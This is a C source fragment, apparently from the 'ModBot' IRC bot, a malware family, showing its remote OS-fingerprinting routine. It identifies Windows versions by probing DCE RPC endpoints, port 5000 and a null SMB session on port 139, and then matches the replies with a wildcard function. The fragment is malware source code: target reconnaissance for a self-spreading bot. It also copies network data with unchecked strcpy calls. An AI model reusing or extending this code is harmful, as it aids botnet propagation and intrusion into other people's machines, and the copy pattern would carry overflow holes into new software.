					if(iErr==SOCKET_ERROR) { 
						fclosesocket(sSocket); 
						return iRetVal; 
					}
					iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf),0);
					if(iErr==SOCKET_ERROR) { 
						fclosesocket(sSocket); 
						return iRetVal; 
					}
					if(szRecvBuf[2]==DCE_PKT_RESPONSE) {	
						if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1)) {	
							if(iErr<300) 
								iRetVal=OS_WINNT; 
							else 
								iRetVal=OS_WIN2K; 
						} else 
							if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
								iRetVal=OS_WINXP;
							else
								iRetVal=OS_UNKNOWN; 
					} else {	
						fclosesocket(sSocket); 
						return iRetVal; 
					} 
				} else {	
					fclosesocket(sSocket); 
					return iRetVal; 
				} 
			} else {	
				fclosesocket(sSocket); 
				return iRetVal; 
			}
			fclosesocket(sSocket); 
			return iRetVal; 
		}
		break;
	case FP_PORT5K:
		if(AdvPortOpen(finet_addr(szHost), 5000, 3)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	case FP_SMB:
		{
			int iRetVal=OS_UNKNOWN, iRecvd;
			BOOL bOkToParse=FALSE;

			int sSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	    
			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) 
				return OS_UNKNOWN;

			char szRecvBuf[8192];
			char sWorkgroup[512], sServer[512], sOS[512];

			SOCKADDR_IN ssin; 
			ZeroMemory(&ssin, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=fhtons(139); 
			ssin.sin_addr.s_addr=ResolveAddress((char *)szHost);
	    
			int iErr=fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {

				iErr=fsend(sSocket, sessionrequest, sizeof(sessionrequest)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				
				iErr=fsend(sSocket, negotiate, sizeof(negotiate)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				
				iErr=fsend(sSocket, setupaccount, sizeof(setupaccount)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iRecvd=iErr;

				int iZeroCounter=0; iRecvd--;
				while((--iRecvd>0)&&(iZeroCounter<4))
				{
					if(szRecvBuf[iRecvd]==0x00)
					{
						switch(iZeroCounter)
						{
							case 0: strcpy(sWorkgroup,(char*)&(szRecvBuf[iRecvd+1])); break;
							case 1: strcpy(sServer,(char*)&(szRecvBuf[iRecvd+1])); break;
							case 2: strcpy(sOS,(char*)&(szRecvBuf[iRecvd+1])); break;
							default: break;
						}
						iZeroCounter++;
					}
				}
				bOkToParse=TRUE;

			} else {
				return iRetVal;
			}
			fclosesocket(sSocket); 
#ifdef _DEBUG
			printf("sWorkgroup: %s\n",sWorkgroup);
			printf("sServer: %s\n",sServer);
			printf("sOS: %s\n",sOS);
#endif
			if(bOkToParse)
			{

				if (wildcardfit("Windows Server 2003 *.*",sServer))
					return OS_WIN2K3;

				if (wildcardfit("NT LAN Manager *.*",sServer))
					return OS_WINNT;

				if (wildcardfit("Windows 2000 LAN Manager*",sServer))
					if (!strcmp("Windows 5.0",sOS))
						return OS_WIN2K;
					
				if (wildcardfit("Windows 2000 LAN Manager*",sServer))
					if (!strcmp("Windows 5.1",sOS))
						return OS_WINXP;

				if (wildcardfit("Samba *",sServer))
					return OS_LINUX;
			}

			return iRetVal;
		}
		break;
	case FP_NP:
		{
			char szPipePath[MAX_PATH];
			int iRetVal=OS_UNKNOWN;
			_snprintf(szPipePath,sizeof(szPipePath),"\\\\%s\\",szHost);
			strncat(szPipePath,"pipe\\epmapper",sizeof(szPipePath));
			HANDLE hFile=CreateFile(szPipePath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,NULL);
			if(hFile!=INVALID_HANDLE_VALUE)
			{	
				char *szInBuf=(char*)malloc(100000);
				memset(szInBuf, 0, 100000);
				
				DWORD dwRead;
				TransactNamedPipe(hFile, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, szInBuf, 10000, &dwRead, NULL);
				if(szInBuf[2]==DCE_PKT_BINDACK)
				{
					TransactNamedPipe(hFile, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1, szInBuf, 10000, &dwRead, NULL);
					if(szInBuf[2]==DCE_PKT_RESPONSE)
					{
						if (MemContains(szInBuf, dwRead, w2kuuid_sig, sizeof(w2kuuid_sig)-1))
						{
							if(dwRead<300)
								iRetVal=OS_WINNT;
							else
								iRetVal=OS_WIN2K;
						}
						else if (MemContains(szInBuf, dwRead, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
							iRetVal=OS_WINXP;
						else
							iRetVal=OS_UNKNOWN;
					}
				}
				free(szInBuf);
				CloseHandle(hFile);
			}
			return iRetVal;
		}
		break;

	default:
		return OS_UNKNOWN;
		break; 
	}
	return OS_UNKNOWN;
}

#ifndef NO_WILDCARD

int wildcardfit(char *wildcard, char *test)
{
	int fit = 1;
  
	for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++) {
		switch (*wildcard) {
		case '[':
			wildcard++;
			fit = set (&wildcard, &test);
			break;
		case '?':
			test++;
			break;
		case '*':
			fit = asterisk (&wildcard, &test);
			wildcard--;
			break;
		default:
			fit = (int) (*wildcard == *test);
			test++;
		}
	}
	while ((*wildcard == '*') && (1 == fit)) 
		wildcard++;

	return ((int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard)));
}

int set(char **wildcard, char **test)
{
	int fit = 0, negation = 0, at_beginning = 1;

	if ('!' == **wildcard) {
		negation = 1;
		(*wildcard)++;
	}
	while ((']' != **wildcard) || (1 == at_beginning)) {
		if (0 == fit) {
			if (('-' == **wildcard) && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
				&& (']' != *(*wildcard + 1)) && (0 == at_beginning)) {
				if (((**test) >= (*(*wildcard - 1))) && ((**test) <= (*(*wildcard + 1)))) {
					fit = 1;
					(*wildcard)++;
				}
			}
			else if ((**wildcard) == (**test))
              fit = 1;
		}
		(*wildcard)++;
		at_beginning = 0;
	}
	if (1 == negation)
		fit = 1 - fit;
	if (1 == fit) 
		(*test)++;

	return (fit);
}

int asterisk(char **wildcard, char **test)
{
	int fit = 1;

	(*wildcard)++; 
	while (('\000' != (**test)) && (('?' == **wildcard) || ('*' == **wildcard))) {
		if ('?' == **wildcard) 
			(*test)++;
		(*wildcard)++;
	}
	while ('*' == (**wildcard))
		(*wildcard)++;

	if (('\0' == (**test)) && ('\0' != (**wildcard)))
		return (fit = 0);
	if (('\0' == (**test)) && ('\0' == (**wildcard)))
		return (fit = 1); 
	else {
		if (0 == wildcardfit(*wildcard, (*test))) {
			do {
				(*test)++;
				while (((**wildcard) != (**test)) && ('['  != (**wildcard)) && ('\0' != (**test)))
					(*test)++;
			} while ((('\0' != **test))?(0 == wildcardfit ((char *)*wildcard, (*test))):(0 != (fit = 0)));
		}
		if (('\0' == **test) && ('\0' == **wildcard))
			fit = 1;
		return (fit);
	}
}

#endif
#endif

/////////////////////////////////////////////////
//              120|-[ModBot]-V1.0             //
/////////////////////////////////////////////////  